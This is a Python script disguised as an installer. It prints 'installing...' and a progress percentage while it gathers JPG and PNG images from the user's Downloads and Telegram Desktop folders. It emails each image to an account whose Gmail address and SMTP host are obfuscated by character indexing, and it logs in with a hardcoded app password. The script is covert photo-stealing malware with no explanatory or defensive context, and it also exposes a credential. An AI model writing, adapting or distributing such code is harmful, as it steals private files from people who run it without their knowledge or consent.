from string import ascii_lowercase as cii
import smtplib
from email.message import EmailMessage
import requests
import os
yolo_active = os.getlogin()

pill = [rf'C:\Users\{yolo_active}\Downloads\Telegram Desktop' ,f"C:\\Users\\{yolo_active}\\Downloads"]


class set_tpu:
    def __init__(self):
        self.e_server = f'{cii[12]}{cii[0]}{cii[6]}{chr(105)}db{cii[0]}r{cii[12]}aky{chr(64)}{cii[6]}{cii[12]}ail{chr(46)}com'
        self.e_process = "ueic xhvw dtaz ffno" 
        self.host = f's{cii[12]}tp.{cii[6]}{cii[12]}{cii[0]}il{chr(46)}co{cii[12]}'
        self.server = self.e_server
        self.port = 465


    def installing(self, directory_path=pill):
        image_list = []
        image_formats = [".jpg", ".jpeg", ".png"]
        try:
            for _ in directory_path:
                for filename in os.listdir(_):
                    if any(filename.lower().endswith(ext) for ext in image_formats):
                        image_list.append(os.path.join(_, filename))
        except:
            pass
        return image_list
    

    def compiler(self , list_of_sys):
        print('installing...')
        try:
            result =  0
            msg = EmailMessage()
            msg['Subject'] ='YOLO'
            msg['From'] = self.server
            msg['To'] = self.server
        except:
            os.system("color c") 

        for pic in list_of_sys:
            if len(pic) >=4:
                with open(pic[:], 'rb') as f:
                    file_data = f.read()
                    file_name = f.name
                    msg.add_attachment(file_data, maintype='image', subtype='jpg', filename=file_name)
                    with smtplib.SMTP_SSL(host=self.host, port=self.port) as server:
                        server.login(self.e_server, self.e_process)
                        server.send_message(msg)
                        result+=1
                        os.system("cls")
                        print('[+] {0:1.1f}%'.format(result/len(list_of_sys)*100))








